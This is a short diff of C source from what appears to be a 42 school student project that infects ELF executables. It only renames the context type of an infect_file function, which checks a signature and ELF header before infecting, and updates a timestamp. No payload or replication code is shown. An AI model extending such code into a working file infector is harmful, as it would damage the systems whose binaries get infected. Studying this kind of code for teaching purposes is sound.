@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
-/*   Updated: 2026/04/15 16:17:36 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/04/18 14:37:31 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -25,7 +25,7 @@
 	@param ctx context used to check if file isnt already infected
 	@param path path to targeted executable
 */
-int	infect_file(t_ctx *ctx, const char *path)
+int	infect_file(t_exec_ctx *ctx, const char *path)
 {
 	if (check_signature(path) == -1
 		|| check_elf_hdr(path) == -1)
